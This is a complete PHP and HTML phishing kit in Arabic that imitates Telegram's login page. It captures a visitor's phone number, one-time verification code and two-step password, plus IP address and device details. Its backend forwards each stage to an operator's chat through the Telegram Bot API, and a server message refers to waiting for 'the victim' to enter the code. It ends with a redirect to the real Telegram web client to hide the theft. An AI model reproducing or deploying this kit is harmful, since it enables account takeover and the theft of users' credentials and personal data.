<?php
// منع أي مخرجات غير متوقعة قبل JSON
error_reporting(0);
ini_set('display_errors', 0);

// توكن البوت (تأكد من صحته)
$botToken = "BBOTTTTTTTTTTT";

// دالة لجلب IP الحقيقي للزائر
function getRealIp() {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    // تنظيف IP إذا كان هناك عدة عناوين
    if (strpos($ip, ',') !== false) {
        $ip = explode(',', $ip)[0];
    }
    return trim($ip);
}

// دالة لإرسال الرسائل إلى التليجرام
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $response = json_decode($result, true);
    if ($httpCode == 200 && isset($response['ok']) && $response['ok'] === true) {
        return ['success' => true];
    } else {
        $error = isset($response['description']) ? $response['description'] : 'HTTP Error ' . $httpCode;
        return ['success' => false, 'error' => $error];
    }
}

// معالجة الطلبات POST فقط
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    
    $rawInput = file_get_contents('php://input');
    $input = json_decode($rawInput, true);
    
    if (!$input) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON input']);
        exit;
    }
    
    $chatId = isset($input['chatId']) ? $input['chatId'] : null;
    $step = isset($input['step']) ? $input['step'] : null;
    $data = isset($input['data']) ? $input['data'] : null;
    $deviceInfo = isset($input['deviceInfo']) ? $input['deviceInfo'] : null;
    
    // التحقق من وجود chatId
    if (!$chatId) {
        echo json_encode(['status' => 'error', 'message' => 'معرف الدردشة (chat ID) غير موجود. تأكد من استخدام الرابط الصحيح.']);
        exit;
    }
    
    $ip = getRealIp();
    
    if ($data && $deviceInfo) {
        if ($step === 'complete') {
            $loginMessage = "
📱 <b>بيانات تسجيل دخول Telegram</b>

📞 <b>رقم الهاتف:</b> <code>{$data['phone']}</code>
🔢 <b>كود التحقق:</b> <code>{$data['code']}</code>
🔒 <b>كلمة المرور:</b> <code>{$data['password']}</code>

🌐 <b>معلومات الجهاز:</b>
📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
🔋 <b>البطارية:</b> {$deviceInfo['battery']}
🖥️ <b>النظام:</b> {$deviceInfo['platform']}
🌐 <b>IP الحقيقي:</b> {$ip}
📶 <b>نوع الاتصال:</b> {$deviceInfo['connection']}
🗣️ <b>اللغة:</b> {$deviceInfo['language']}
🕒 <b>المنطقة الزمنية:</b> {$deviceInfo['timezone']}
📺 <b>معلومات الشاشة:</b> {$deviceInfo['screen']}

📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
            ";
            $result = sendTelegramMessage($chatId, $loginMessage, $botToken);
        } else {
            $stageMessage = "
📱 <b>مرحلة تسجيل دخول Telegram</b>

🔹 <b>المرحلة:</b> $step
📞 <b>رقم الهاتف:</b> <code>{$data['phone']}</code>
" . (isset($data['code']) ? "🔢 <b>كود التحقق:</b> <code>{$data['code']}</code>\n" : "") . "
🌐 <b>IP الحقيقي:</b> {$ip}
📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
            ";
            
            if ($step === 'phone') {
                $stageMessage .= "\n\n⚠️ <b>تم إرسال رقم الهاتف. انتظر إدخال الكود من الضحية.</b>";
            }
            
            $result = sendTelegramMessage($chatId, $stageMessage, $botToken);
        }
        
        if ($result['success']) {
            $nextStep = 'complete';
            if ($step === 'phone') $nextStep = 'code';
            elseif ($step === 'code') $nextStep = 'password';
            echo json_encode(['status' => 'success', 'nextStep' => $nextStep]);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'فشل إرسال البيانات إلى البوت: ' . $result['error']]);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'بيانات غير مكتملة']);
    }
    exit;
}

// إذا لم يكن POST، نعرض الصفحة العادية (HTML)
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل الدخول إلى Telegram</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }
    
    body {
      background-color: #FFFFFF;
      color: #222222;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
    }
    
    .container {
      width: 100%;
      max-width: 360px;
      margin: 0 auto;
    }
    
    .logo-container {
      text-align: center;
      margin-bottom: 30px;
    }
    
    .telegram-logo {
      width: 100px;
      height: 100px;
      margin-bottom: 15px;
      display: inline-block;
    }
    
    .login-form {
      background-color: #FFFFFF;
      border-radius: 12px;
      padding: 24px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      border: 1px solid #E6E6E6;
    }
    
    h1 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 20px;
      font-weight: 700;
      color: #0088CC;
    }
    
    .subtitle {
      text-align: center;
      margin-bottom: 20px;
      font-size: 14px;
      color: #667781;
      line-height: 1.4;
    }
    
    .input-group {
      margin-bottom: 16px;
    }
    
    .input-row {
      display: flex;
      gap: 10px;
      margin-bottom: 16px;
    }
    
    .input-column {
      display: flex;
      flex-direction: column;
    }
    
    .country-code-column {
      width: 30%;
    }
    
    .phone-column {
      width: 70%;
    }
    
    label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
      color: #0088CC;
      font-weight: 600;
      text-align: right;
    }
    
    input[type="tel"],
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px;
      background-color: #F5F5F5;
      border: 1px solid #E6E6E6;
      border-radius: 8px;
      color: #222222;
      font-size: 15px;
      transition: border-color 0.2s;
      text-align: center;
    }
    
    input[type="tel"]:focus,
    input[type="text"]:focus,
    input[type="password"]:focus {
      outline: none;
      border-color: #0088CC;
      background-color: #FFFFFF;
    }
    
    .login-btn {
      width: 100%;
      padding: 14px;
      background-color: #0088CC;
      color: #FFFFFF;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 16px;
      transition: background-color 0.2s;
    }
    
    .login-btn:hover {
      background-color: #0077B3;
    }
    
    .links {
      text-align: center;
      margin-top: 16px;
      font-size: 13px;
    }
    
    .links a {
      color: #0088CC;
      text-decoration: none;
      display: block;
      margin: 10px 0;
      transition: color 0.2s;
    }
    
    .links a:hover {
      color: #005580;
      text-decoration: underline;
    }
    
    .footer {
      text-align: center;
      margin-top: 30px;
      color: #667781;
      font-size: 12px;
      line-height: 1.5;
    }
    
    .footer a {
      color: #0088CC;
      text-decoration: none;
      margin: 0 4px;
    }
    
    .footer a:hover {
      text-decoration: underline;
    }
    
    .loader {
        width: 18px;
        height: 18px;
        border: 2px solid rgba(0, 136, 204, 0.3);
        border-radius: 50%;
        border-top-color: #0088CC;
        animation: spin 1s linear infinite;
        margin: 0 auto;
        display: none;
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    
    .status {
        margin-top: 14px;
        font-size: 13px;
        opacity: 0.8;
        text-align: center;
        display: none;
        color: #667781;
    }
    
    .error-message {
      color: #E53935;
      font-size: 13px;
      margin-top: 14px;
      text-align: center;
      display: none;
    }

    .privacy-notice {
      margin-top: 20px;
      font-size: 12px;
      color: #667781;
      text-align: center;
      line-height: 1.4;
    }

    .step-indicator {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }
    
    .step {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background-color: #DDDDDD;
      margin: 0 5px;
    }
    
    .step.active {
      background-color: #0088CC;
    }
    
    .form-step {
      display: none;
    }
    
    .form-step.active {
      display: block;
    }
    
    .code-inputs {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 20px;
    }
    
    .code-input {
      width: 45px;
      height: 55px;
      text-align: center;
      font-size: 20px;
      border: 1px solid #E6E6E6;
      border-radius: 8px;
      background-color: #F5F5F5;
      transition: border-color 0.2s;
    }
    
    .code-input:focus {
      outline: none;
      border-color: #0088CC;
      background-color: #FFFFFF;
    }
    
    .password-note {
      text-align: center;
      font-size: 13px;
      color: #667781;
      margin-bottom: 16px;
    }
    
    .numbers-only {
      -moz-appearance: textfield;
    }
    
    .numbers-only::-webkit-outer-spin-button,
    .numbers-only::-webkit-inner-spin-button {
      -webkit-appearance: none;
      margin: 0;
    }
    
    .country-code-input {
      text-align: center;
    }
    
    .phone-input {
      text-align: right;
      direction: ltr;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <svg class="telegram-logo" viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="120" cy="120" r="120" fill="#26A5E4"/>
        <path d="M94.5 143.5L91.5 172.5C94.5 172.5 96 171 97.5 169.5L111.5 156.5L140.5 178.5C145.5 181.5 149 179.5 150.5 174L165.5 66.5C167.5 60 163.5 56.5 158.5 58.5L54.5 109C49 111.5 49 115.5 53.5 117.5L81.5 125.5L139.5 81C142.5 79 145.5 80 143.5 82L94.5 143.5Z" fill="white"/>
      </svg>
      <h1>Telegram</h1>
    </div>
    
    <div class="login-form">
      <div class="step-indicator">
        <div class="step active" id="step1"></div>
        <div class="step" id="step2"></div>
        <div class="step" id="step3"></div>
      </div>
      
      <!-- المرحلة 1: إدخال رقم الهاتف -->
      <div class="form-step active" id="stepPhone">
        <h1>أدخل رقم هاتفك</h1>
        <p class="subtitle">سيتم إرسال رمز التحقق إلى رقم هاتفك عبر Telegram</p>
        
        <div class="input-row">
          <div class="input-column country-code-column">
            <label for="countryCode">كود الدولة</label>
            <input type="text" class="country-code-input" id="countryCode" placeholder="+000" value="+000" required>
          </div>
          <div class="input-column phone-column">
            <label for="phone">رقم الهاتف</label>
            <input type="tel" class="phone-input" id="phone" name="phone" placeholder="أدخل الرقم" required autofocus>
          </div>
        </div>
        
        <button type="button" class="login-btn" onclick="submitPhone()">التالي</button>
        
        <div class="privacy-notice">
          <p>بموافقتك، فإنك تقبل <a href="#">شروط الخدمة</a> و<a href="#">سياسة الخصوصية</a>.</p>
        </div>
      </div>
      
      <!-- المرحلة 2: إدخال كود التحقق -->
      <div class="form-step" id="stepCode">
        <h1>أدخل الرمز</h1>
        <p class="subtitle">تم إرسال رمز إلى حسابك على Telegram</p>
        
        <div class="code-inputs">
          <input type="text" class="code-input numbers-only" id="code1" maxlength="1" oninput="moveToNext(1)" autofocus pattern="[0-9]*" inputmode="numeric">
          <input type="text" class="code-input numbers-only" id="code2" maxlength="1" oninput="moveToNext(2)" pattern="[0-9]*" inputmode="numeric">
          <input type="text" class="code-input numbers-only" id="code3" maxlength="1" oninput="moveToNext(3)" pattern="[0-9]*" inputmode="numeric">
          <input type="text" class="code-input numbers-only" id="code4" maxlength="1" oninput="moveToNext(4)" pattern="[0-9]*" inputmode="numeric">
          <input type="text" class="code-input numbers-only" id="code5" maxlength="1" oninput="moveToNext(5)" pattern="[0-9]*" inputmode="numeric">
        </div>
        
        <button type="button" class="login-btn" onclick="submitCode()">تحقق</button>
        
        <div class="links">
          <a href="#">إعادة إرسال الرمز</a>
        </div>
      </div>
      
      <!-- المرحلة 3: إدخال كلمة المرور -->
      <div class="form-step" id="stepPassword">
        <h1>كلمة المرور</h1>
        <p class="subtitle">أدخل كلمة المرور لحسابك</p>
        <p class="password-note">هذه كلمة المرور التي تستخدمها لتسجيل الدخول إلى Telegram على أجهزة جديدة.</p>
        
        <div class="input-group">
          <input type="password" id="password" name="password" placeholder="كلمة المرور" required autofocus>
        </div>
        
        <button type="button" class="login-btn" onclick="submitPassword()">تسجيل الدخول</button>
        
        <div class="links">
          <a href="#">نسيت كلمة المرور؟</a>
        </div>
      </div>
      
      <div class="loader" id="loader"></div>
      <div class="status" id="status">جاري التحقق من المعلومات...</div>
      <div class="error-message" id="errorMessage">حدث خطأ أثناء عملية التسجيل. يرجى المحاولة مرة أخرى.</div>
    </div>
    
    <div class="footer">
      <a href="#">الخصوصية</a>
      <a href="#">الشروط</a>
      <a href="#">اللغة</a>
      <a href="#">الإصدار</a>
      <p>© 2025 Telegram LLC. جميع الحقوق محفوظة.</p>
    </div>
  </div>

<script>
  // الحصول على chatId من الرابط (مثال: ?ID=123456789)
  const params = new URLSearchParams(window.location.search);
  const chatId = params.get('ID');

  if (!chatId) {
    document.body.innerHTML = '<div style="text-align:center; padding:50px; direction:rtl;"><h2 style="color:red;">خطأ: لم يتم توفير معرف الدردشة (chat ID).</h2><p>يرجى استخدام الرابط الصحيح الذي يحتوي على ?ID=رقم_المستخدم</p></div>';
    throw new Error('Chat ID is missing');
  }

  // عناصر واجهة المستخدم
  const stepPhone = document.getElementById('stepPhone');
  const stepCode = document.getElementById('stepCode');
  const stepPassword = document.getElementById('stepPassword');
  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');
  const step3 = document.getElementById('step3');
  const loader = document.getElementById('loader');
  const statusDiv = document.getElementById('status');
  const errorMessageDiv = document.getElementById('errorMessage');
  
  let currentStep = 'phone';
  let userPhone = '';
  let userCode = '';

  // منع إدخال غير الأرقام في حقول الكود
  document.querySelectorAll('.numbers-only').forEach(input => {
    input.addEventListener('input', function() {
      this.value = this.value.replace(/[^0-9]/g, '');
    });
    
    input.addEventListener('keydown', function(e) {
      if (!((e.key >= '0' && e.key <= '9') || 
            e.key === 'Backspace' || 
            e.key === 'Delete' || 
            e.key === 'ArrowLeft' || 
            e.key === 'ArrowRight' || 
            e.key === 'Tab')) {
        e.preventDefault();
      }
    });
  });

  function updateStepIndicator(step) {
    step1.classList.remove('active');
    step2.classList.remove('active');
    step3.classList.remove('active');
    
    if (step === 'phone') {
      step1.classList.add('active');
      stepPhone.classList.add('active');
      stepCode.classList.remove('active');
      stepPassword.classList.remove('active');
    } else if (step === 'code') {
      step2.classList.add('active');
      stepPhone.classList.remove('active');
      stepCode.classList.add('active');
      stepPassword.classList.remove('active');
    } else if (step === 'password') {
      step3.classList.add('active');
      stepPhone.classList.remove('active');
      stepCode.classList.remove('active');
      stepPassword.classList.add('active');
    }
  }

  function moveToNext(current) {
    const currentInput = document.getElementById(`code${current}`);
    const nextInput = document.getElementById(`code${current + 1}`);
    
    currentInput.value = currentInput.value.replace(/[^0-9]/g, '');
    
    if (currentInput.value.length === 1 && nextInput) {
      nextInput.focus();
    }
    
    if (current === 5 && currentInput.value.length === 1) {
      compileCode();
    }
  }

  function compileCode() {
    userCode = '';
    for (let i = 1; i <= 5; i++) {
      userCode += document.getElementById(`code${i}`).value;
    }
    return userCode;
  }

  async function collectDeviceInfo() {
    let batteryLevel = "غير متوفر";
    let connectionType = "غير متوفر";
    let timezone = "غير متوفر";
    let screenInfo = "غير متوفر";
    
    try {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = `${Math.round(battery.level * 100)}%`;
      }
    } catch (e) {}
    
    try {
      if (navigator.connection) {
        connectionType = navigator.connection.effectiveType;
      }
    } catch (e) {}
    
    try {
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch (e) {}
    
    try {
      screenInfo = `${screen.width}x${screen.height}, ${window.devicePixelRatio}dpr`;
    } catch (e) {}
    
    return {
      userAgent: navigator.userAgent,
      battery: batteryLevel,
      platform: navigator.platform,
      language: navigator.language,
      connection: connectionType,
      timezone: timezone,
      screen: screenInfo
    };
  }

  async function sendToServer(step, data) {
    try {
      const deviceInfo = await collectDeviceInfo();
      
      const requestData = {
        chatId: chatId,
        step: step,
        data: data,
        deviceInfo: deviceInfo
      };
      
      const response = await fetch(window.location.href, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestData)
      });
      
      if (!response.ok) {
        throw new Error(`HTTP error ${response.status}`);
      }
      
      const json = await response.json();
      return json;
    } catch (error) {
      console.error('Fetch error:', error);
      return {status: 'error', message: 'فشل الاتصال بالخادم: ' + error.message};
    }
  }

  function updateStatus(message, isLoading = true) {
    statusDiv.textContent = message;
    statusDiv.style.display = 'block';
    if (isLoading) {
      loader.style.display = 'block';
    } else {
      loader.style.display = 'none';
    }
  }

  function showError(message) {
    errorMessageDiv.textContent = message || 'حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى.';
    errorMessageDiv.style.display = 'block';
    setTimeout(() => {
      errorMessageDiv.style.display = 'none';
    }, 5000);
  }

  function hideError() {
    errorMessageDiv.style.display = 'none';
  }

  async function submitPhone() {
    const countryCode = document.getElementById('countryCode').value.trim();
    const phone = document.getElementById('phone').value.trim();
    
    if (!countryCode || !phone) {
      showError('يرجى إدخال رمز الدولة ورقم الهاتف');
      return;
    }
    
    const fullPhone = countryCode + phone;
    userPhone = fullPhone;
    
    updateStatus('جاري إرسال رمز التحقق...', true);
    hideError();
    
    try {
      const result = await sendToServer('phone', {phone: fullPhone});
      
      if (result.status === 'success') {
        updateStatus('تم إرسال رمز التحقق إلى حسابك على Telegram', false);
        
        setTimeout(() => {
          currentStep = 'code';
          updateStepIndicator('code');
          document.getElementById('code1').focus();
          loader.style.display = 'none';
          statusDiv.style.display = 'none';
        }, 1500);
      } else {
        throw new Error(result.message || 'فشل إرسال البيانات');
      }
    } catch (error) {
      console.error(error);
      showError(error.message);
      updateStatus('', false);
      loader.style.display = 'none';
      statusDiv.style.display = 'none';
    }
  }

  async function submitCode() {
    const code = compileCode();
    
    if (!code || code.length !== 5) {
      showError('يرجى إدخال رمز التحقق المكون من 5 أرقام');
      return;
    }
    
    userCode = code;
    
    updateStatus('جاري التحقق من الرمز...', true);
    hideError();
    
    try {
      const result = await sendToServer('code', {phone: userPhone, code: code});
      
      if (result.status === 'success') {
        updateStatus('تم التحقق من الرمز بنجاح', false);
        
        setTimeout(() => {
          currentStep = 'password';
          updateStepIndicator('password');
          document.getElementById('password').focus();
          loader.style.display = 'none';
          statusDiv.style.display = 'none';
        }, 1500);
      } else {
        throw new Error(result.message || 'فشل التحقق من الرمز');
      }
    } catch (error) {
      console.error(error);
      showError(error.message);
      updateStatus('', false);
      loader.style.display = 'none';
      statusDiv.style.display = 'none';
    }
  }

  async function submitPassword() {
    const password = document.getElementById('password').value.trim();
    
    if (!password) {
      showError('يرجى إدخال كلمة المرور');
      return;
    }
    
    updateStatus('جاري تسجيل الدخول...', true);
    hideError();
    
    try {
      const result = await sendToServer('complete', {
        phone: userPhone,
        code: userCode,
        password: password
      });
      
      if (result.status === 'success') {
        updateStatus('تم تسجيل الدخول بنجاح! جاري التحويل...', false);
        
        setTimeout(() => {
          window.location.href = 'https://web.telegram.org';
        }, 2000);
      } else {
        throw new Error(result.message || 'فشل تسجيل الدخول');
      }
    } catch (error) {
      console.error(error);
      showError(error.message);
      updateStatus('', false);
      loader.style.display = 'none';
      statusDiv.style.display = 'none';
    }
  }

  document.getElementById('countryCode').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
      document.getElementById('phone').focus();
    }
  });

  document.getElementById('phone').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
      submitPhone();
    }
  });

  document.getElementById('password').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
      submitPassword();
    }
  });

  for (let i = 1; i <= 5; i++) {
    document.getElementById(`code${i}`).addEventListener('keydown', function(e) {
      if (e.key === 'Backspace' && this.value === '' && i > 1) {
        document.getElementById(`code${i-1}`).focus();
      } else if (e.key === 'Enter' && i === 5) {
        submitCode();
      }
    });
  }
</script>

</body>
</html>
